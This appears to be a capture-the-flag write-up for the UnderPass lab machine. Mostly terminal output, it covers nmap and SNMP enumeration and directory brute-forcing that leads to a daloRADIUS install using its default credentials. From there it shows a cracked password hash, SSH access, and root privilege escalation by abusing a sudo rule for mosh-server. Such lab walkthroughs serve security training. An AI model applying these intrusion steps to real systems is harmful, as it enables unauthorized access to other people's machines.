# UnderPass



## Quick Nmap Scan

```perl
✓   UnderPass (black@d4rk-pr0xy) ⇝ nmap 10.10.11.48 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-03 16:27 IST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 24.67% done; ETC: 16:27 (0:00:09 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### Let's do some aggresive scan

```perl
✗   UnderPass (black@d4rk-pr0xy) ⇝ nmap -sC -sV -vv -A -oN nmap.txt 10.10.11.48

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48b0d2c72926ae3dfbb76b0ff54d2aea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb6164b81b1bb5bab84586c516bbe2a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Let's take a look at 80

* It's a default Apache Page
* Quick Dir bruteforce on 80

```ruby
gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/01/03 16:45:02 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.                    (Status: 200) [Size: 10671]
/.htaccess            (Status: 403) [Size: 276]  
/.phtml               (Status: 403) [Size: 276]  
/.htc                 (Status: 403) [Size: 276]  
/.html_var_DE         (Status: 403) [Size: 276]  
/server-status        (Status: 403) [Size: 276]  
/.htpasswd            (Status: 403) [Size: 276]  
/.html.               (Status: 403) [Size: 276]  
/.html.html           (Status: 403) [Size: 276]  
/.htpasswds           (Status: 403) [Size: 276]  
/.htm.                (Status: 403) [Size: 276]  
/.htmll               (Status: 403) [Size: 276]  
/.phps                (Status: 403) [Size: 276]  
/.html.old            (Status: 403) [Size: 276]  
/.ht                  (Status: 403) [Size: 276]  
/.html.bak            (Status: 403) [Size: 276]  
/.htm.htm             (Status: 403) [Size: 276]  
/.hta                 (Status: 403) [Size: 276]  
/.htgroup             (Status: 403) [Size: 276]  
/.html1               (Status: 403) [Size: 276]  
/.html.LCK            (Status: 403) [Size: 276]  
/.html.printable      (Status: 403) [Size: 276]  
/.htm.LCK             (Status: 403) [Size: 276]  
Progress: 25177 / 43008 (58.54%)                ^C
[!] Keyboard interrupt detected, terminating.                                           
```


* Nothing is there

### let's try with UDP scan

```
sudo nmap -sU 10.10.11.48 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-03 17:00 IST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.73% done; ETC: 17:02 (0:01:53 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.97% done; ETC: 17:07 (0:06:38 remaining)
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 3.50% done; ETC: 17:08 (0:08:16 remaining)
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 5.64% done; ETC: 17:11 (0:10:35 remaining)
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 7.96% done; ETC: 17:13 (0:11:57 remaining)

```
It taking lots of time So I'm gona use Timing template

```
UnderPass (black@d4rk-pr0xy) ⇝ sudo nmap -sU -T5 10.10.11.48 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-03 17:03 IST
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.20% done; ETC: 17:05 (0:01:54 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 14.40% done; ETC: 17:05 (0:01:29 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 27.53% done; ETC: 17:05 (0:01:37 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.27s latency).
Not shown: 753 open|filtered udp ports (no-response), 246 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 254.82 seconds

```

* Now I got port 161 is open on udp

* lets check with snmp-check

```
  UnderPass (black@d4rk-pr0xy) ⇝ snmp-check 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 01:33:51.59
  Uptime system                 : 01:33:36.65
  System date                   : 2025-1-3 11:35:05.0

```

* I'm gona use gobuster one more time 

```
l tcp 10.10.11.48:80: connect: no route to host
✗   UnderPass (black@d4rk-pr0xy) ⇝ gobuster dir -u http://10.10.11.48/daloradius/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/01/03 17:14:48 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/LICENSE              (Status: 200) [Size: 18011]
/app                  (Status: 301) [Size: 319] [--> http://10.10.11.48/daloradius/app/]
/library              (Status: 301) [Size: 323] [--> http://10.10.11.48/daloradius/library/]
/doc                  (Status: 301) [Size: 319] [--> http://10.10.11.48/daloradius/doc/]    
/.                    (Status: 403) [Size: 276]                                             
/contrib              (Status: 301) [Size: 323] [--> http://10.10.11.48/daloradius/contrib/]
/.htaccess            (Status: 403) [Size: 276]                                             
/setup                (Status: 301) [Size: 321] [--> http://10.10.11.48/daloradius/setup/]  
/.phtml               (Status: 403) [Size: 276]                                             
/.htc                 (Status: 403) [Size: 276]                                             
/.html_var_DE         (Status: 403) [Size: 276]                                             
/.htpasswd            (Status: 403) [Size: 276]
```

* `/app` seems like an application
* Let's try one more time with `/app`
```
 UnderPass (black@d4rk-pr0xy) ⇝ gobuster dir -u http://10.10.11.48/daloradius/app/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/app/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/01/03 17:20:17 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/common               (Status: 301) [Size: 326] [--> http://10.10.11.48/daloradius/app/common/]
/users                (Status: 301) [Size: 325] [--> http://10.10.11.48/daloradius/app/users/] 
/.                    (Status: 403) [Size: 276]                                                
/.htaccess            (Status: 403) [Size: 276]                                                
/.phtml               (Status: 403) [Size: 276]                                                
/.htc                 (Status: 403) [Size: 276]       
```

* once I try to access `/app/users`. I got login page
* Issue is I need credintial
* I got /doc/install/INSTALL after went through all dirs 

```
============================
✓   UnderPass (black@d4rk-pr0xy) ⇝ gobuster dir -u http://10.10.11.48/daloradius/doc/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/doc/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/01/03 17:27:08 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/install              (Status: 301) [Size: 327] [--> http://10.10.11.48/daloradius/doc/install/]
/.php                 (Status: 403) [Size: 276]                                                 
/.htm                 (Status: 403) [Size: 276]                                                 
/.                    (Status: 403) [Size: 276]                                                 
/.htaccess            (Status: 403) [Size: 276]                                                 
/.phtml               (Status: 403) [Size: 276]                                                 
Progress: 1171 / 43008 (2.72%)                                                                 ^C
[!] Keyboard interrupt detected, terminating.
                                                                                                
===============================================================
2025/01/03 17:27:40 Finished
===============================================================
✓   UnderPass (black@d4rk-pr0xy) ⇝ gobuster dir -u http://10.10.11.48/daloradius/doc/install -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.48/daloradius/doc/install
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2025/01/03 17:27:46 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/INSTALL              (Status: 200) [Size: 7814]
/.                    (Status: 403) [Size: 276] 

```

* I got credential in this page 

```
 INSTALLATION COMPLETE
 ------------------------
    Surf to http://yourip/daloradius
    Login:
		username: administrator
		password: radius

    Notice: don't forget to change the default password in the Configuration -> Operators page
			don't forget to also REMOVE completely or rename to some random undetected name the update.php script!

```

### let's login with this credentials in Operators page
* I got logged in 

* once I navigate into Management I Got username and password

```
svcMosh:412DD4759978ACFCC81DEAB01B382403

```
* but Password is hashed

* After Long time the hash cracked :) `underwaterfriends`

* Time to fireup the ssh
```
  UnderPass (black@d4rk-pr0xy) ⇝ ssh svcMosh@10.10.11.48
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ECDSA key fingerprint is SHA256:qlffCic0P1VC7S7OaNvDMaPgBw01T3l58I1lKZvPpAE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ECDSA) to the list of known hosts.
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan  3 12:46:22 PM UTC 2025

  System load:  0.27              Processes:             302
  Usage of /:   88.5% of 3.75GB   Users logged in:       2
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 88.5% of 3.75GB
  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan  3 12:43:10 2025 from 10.10.14.127
svcMosh@underpass:~$ 

```

* I got the user.txt

## Time to Enumeration

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$
```
* well I need to execute /usr/bin/mosh-server

```
svcMosh@underpass:~$ mosh --help sudo /usr/bin/mosh-server 
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND
```

* I have cmd execution in mosh

```
$ mosh --server='sudo /usr/bin/mosh-server' localhost
Warning: SSH_CONNECTION not found; binding to any interface.
```

I got root access finally




